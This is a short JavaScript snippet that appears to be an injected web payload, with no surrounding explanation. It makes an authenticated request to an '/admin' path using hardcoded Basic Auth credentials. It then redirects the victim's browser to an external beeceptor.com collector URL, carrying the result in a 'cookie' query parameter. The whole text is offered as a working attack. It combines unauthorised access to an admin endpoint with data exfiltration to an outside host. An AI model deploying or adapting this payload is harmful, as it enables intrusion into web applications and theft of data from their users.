(async () => {
    let res = 123;
  try {
let headers = new Headers();
  headers.set('Authorization', 'Basic ' + btoa('dev_us' + ":" + 'valera_smeni_kredi_4mo'));
  res = await fetch('/admin', {headers});
  } finally {
  window.location.replace('https://gvfdgdfgfsfd.free.beeceptor.com?cookie=' + JSON.stringify(res))
  }
})()
